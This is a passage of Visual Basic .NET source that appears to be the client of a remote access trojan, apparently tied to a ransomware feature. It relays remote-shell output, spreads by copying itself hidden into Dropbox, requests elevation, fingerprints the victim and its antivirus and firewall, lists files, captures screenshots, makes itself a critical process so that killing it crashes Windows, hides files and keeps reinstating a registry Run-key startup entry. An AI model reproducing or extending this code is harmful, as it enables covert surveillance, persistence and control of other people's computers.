            C.Send(ENB("rs") & Y & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            C.Send(ENB("rsc"))
        Catch ex As Exception
        End Try
    End Sub


    Private Sub PRS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
        Try
            C.Send(ENB("prs") & Y & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub pex()
        Try
            C.Send(ENB("prsc"))
        Catch ex As Exception
        End Try
    End Sub

    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Sub DropBoxSpreadFunc(ByVal FileName As String)
        On Error Resume Next
        If Directory.Exists(("C:\Users\" & Environment.UserName & "\Dropbox\")) Then
            File.Copy(Application.ExecutablePath, ("C:\Users\" & Environment.UserName & "\Dropbox\" & FileName))
            File.SetAttributes("C:\Users\" & Environment.UserName & "\Dropbox\" & FileName, FileAttributes.Hidden)
        End If
    End Sub
    Private Sub RestartElevated()
        Dim startInfo As New ProcessStartInfo()
        startInfo.UseShellExecute = True
        startInfo.WorkingDirectory = Environment.CurrentDirectory
        startInfo.FileName = Application.ExecutablePath
        startInfo.Verb = "runas"
        Try
            Dim p As Process = Process.Start(startInfo)
            C.Send(ENB("MSG") & Y & "Client Privileges Has Been Elevated" & Y & "Succ" & Y & "decode")
            End
        Catch ex As System.ComponentModel.Win32Exception
            C.Send(ENB("MSG") & Y & "Client Refueses To Elevate" & Y & "Fail" & Y & "decode")
            Return
        End Try
    End Sub
    Public Sub UsbVicTim()
        On Error Resume Next
        If Application.ExecutablePath.EndsWith(exen) Then
            spread = "Yes"
        Else
            spread = "No"
        End If
    End Sub
    Public GetProcesses() As Process
    Public Function INF() As String
        Dim x As String
        If My.Settings.TransferStatus = True Then
            x = My.Settings.ID & "_" & HWD() & Y
        Else
            x = Name & "_" & HWD() & Y
        End If
        'mutex
        x &= DEB(MTX) & Y
        ' get pc name
        Try
            x &= Environment.MachineName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try
        ' get User name
        Try
            x &= Environment.UserName & Y
        Catch ex As Exception
            x &= "??" & Y
        End Try

        ' get Country
        x &= Gcc() & Y
        ' Get OS
        Try
            x += F.Info.OSFullName.Replace("©", "").Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win") & Y
        Catch ex As Exception
            x += "Unknown" '& Y
        End Try
      
        x &= GetCPU() & Y
        ' cam
        x &= GetAntiVirus() & Y

        x &= GetFirewall() & Y
        ' version
        x &= Ver & Y
        ' ping
        x &= "" & Y

        x &= ACT() & Y

        ' Install Date
        x &= FR() & Y

        ' check spread
        x &= spread & Y

        x &= check & Y

        If IO.File.Exists(Environ("Temp") & "\Ransom.dat") Then
            x &= "Yes" & Y
        Else
            x &= "No" & Y
        End If

        If My.Settings.Group = "None" Then
            x &= "None" & Y
        Else
            x &= My.Settings.Group & Y
        End If

        Return x
    End Function
    Public Function GetCPU() As String
        Try
            Dim Proc As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
            Proc.Get()
            Return (Proc("Name").ToString)

        Catch ex As Exception
            Return "N/A"
        End Try

    End Function
    Public Function FR() As String ' install Date
        Try
            Return CType(LO, IO.FileInfo).LastWriteTime.ToString("yyyy-MM-dd")
        Catch ex As Exception
            Return "unknown"
        End Try
    End Function
    Function GetFirewall() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str = str.ToString
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
    Public Function checkadmin() As String
        Dim W_Id = WindowsIdentity.GetCurrent()
        Dim WP = New WindowsPrincipal(W_Id)
        Dim isAdmin As Boolean = WP.IsInRole(WindowsBuiltInRole.Administrator)
        If isAdmin = True Then
            Return "Administrator"
        Else
            Return "User"
        End If
    End Function
    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str.ToString()
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
    Public Function GetSystemRAMSize() As Double
        Try
            Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory)
            Return FormatNumber(RAM_Size, 2)

        Catch : End Try
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    '====================================== Window API
    Public Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr ' Get Active window Handle
    Public Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hWnd As IntPtr, ByVal WinTitle As String, ByVal MaxLength As Integer) As Integer
    Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Integer
    Public Function ACT() As String ' Get Active Window Text
        Try
            Dim h As IntPtr = GetForegroundWindow()
            If h = IntPtr.Zero Then
                Return ""
            End If
            Dim w As Integer
            w = GetWindowTextLength(h)
            Dim t As String = StrDup(w + 1, "*")
            GetWindowText(h, t, w + 1)
            Dim pid As Integer
            GetWindowThreadProcessId(h, pid)
            If pid = 0 Then
                Return t
            Else
                Try
                    Return Diagnostics.Process.GetProcessById(pid).MainWindowTitle()
                Catch ex As Exception
                    Return t
                End Try
            End If
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Public Function BS(ByVal b As Byte()) As String ' bytes to String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function SB(ByVal s As String) As Byte() ' String to bytes
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & ENB(d.Name) & "FileManagerSplitFileManagerSplit"
                Case 5
                    allDrives += "[CD]" & ENB(d.Name) & "FileManagerSplitFileManagerSplit"
            End Select
        Next
        Return allDrives
    End Function
    Public Function readtext(ByVal l As String) As String
        Return IO.File.ReadAllText(l)
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & ENB(subdi.Name) & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += ENB(f.Name) & "FileManagerSplit" & Conversion.Str(f.Length) & "FileManagerSplit"
        Next
        Return files
    End Function
    Public Function CaptureDesktop() As Image
        Try
            Dim bounds As Rectangle = Nothing
            Dim screenshot As System.Drawing.Bitmap = Nothing
            Dim graph As Graphics = Nothing
            bounds = Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Return screenshot
        Catch
            Return Nothing
        End Try
    End Function
    '=============================== PC Country
    <DllImport("kernel32.dll")> _
    Private Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function
    Public Function Gcc() As String
        Try
            Dim d = New System.Text.StringBuilder(256)
            Dim i As Integer = GetLocaleInfo(&H400, &H7, d, d.Capacity)
            If i > 0 Then
                Return d.ToString().Substring(0, i - 1)
            End If
        Catch ex As Exception
        End Try
        Return "Unknown"
    End Function
    '======== process protect With BSOD

    <DllImport("ntdll")> _
    Public Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function
    Sub pr(ByVal i As Integer) ' protect process With BSOD
        ' if i= 0  Unprotect, if i=1 Protect
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ED() ' unprotect me if windows restart or logoff
        pr(0)
    End Sub
End Module
Module Exta
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub filehide()
        On Error Resume Next
        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 0)
    End Sub
    Public Sub DStartup(ByVal Name As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.DeleteValue(Name)
    End Sub

End Module

Module StartEvrey
    Public Sub StartWork()
        On Error Resume Next
star:
        If st <> 0 Then Exit Sub
        Dim KA As String = "Microsoft" & "\MyClient"
        System.Threading.Thread.Sleep(5000)
        If IO.File.Exists(Environ(PathS) & "\" & KA & InstallName) Then
            AStartup(startUP, Environ(PathS) & "\" & KA & InstallName)
        Else
            AStartup(startUP, Application.ExecutablePath)
        End If
        GoTo star
    End Sub
End Module


